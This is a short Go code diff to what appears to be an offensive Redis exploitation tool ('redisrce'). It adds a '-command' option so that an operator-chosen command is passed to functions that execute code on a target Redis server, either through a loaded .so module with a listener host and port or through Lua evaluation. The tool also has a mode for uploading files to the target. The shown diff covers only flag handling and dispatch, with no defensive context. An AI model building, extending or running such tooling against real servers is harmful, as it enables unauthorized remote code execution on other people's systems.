@@ -19,6 +19,7 @@ var Host string
 var Port int
 var Lhost string
 var Lport int
+var Command string
 
 func main() {
 	flag.StringVar(&FilePath,"srcpath","","set upload file path")
@@ -26,6 +27,7 @@ func main() {
 	flag.StringVar(&SoFilePath,"so","","set .so file path")
 	flag.StringVar(&Password,"pass","","set redis password")
 	flag.StringVar(&Host,"host","","set target")
+	flag.StringVar(&Command,"command","","Command want to xexc")
 	flag.BoolVar(&Uploadfile,"upload",false,"use upload mode")
 	flag.BoolVar(&Exec,"exec",false,"use execute the command mode")
 	flag.IntVar(&Port,"port",6379,"set redis port")
@@ -43,14 +45,14 @@ func main() {
 			fmt.Println(utils.Red("must set lhost"))
 			os.Exit(0)
 		}
-		redisrce.RdisExec(redisclient,SoFilePath,ServerPath,Lhost,Lport)
+		redisrce.RdisExec(redisclient,SoFilePath,ServerPath,Lhost,Lport,Command)
 	case Uploadfile:
 		if FilePath==""||ServerPath==""||Lhost==""{
 			fmt.Println(utils.Red("must set lhost,srcpath,dstpath"))
 		}
 		redisrce.RedisUpload(redisclient,FilePath,ServerPath,Lhost,Lport)
 	case Lua:
-		redisrce.LuaEval(redisclient)
+		redisrce.LuaEval(redisclient,Command)
 	default:
 		fmt.Println(utils.Red("must set upload or exec"))
 	}
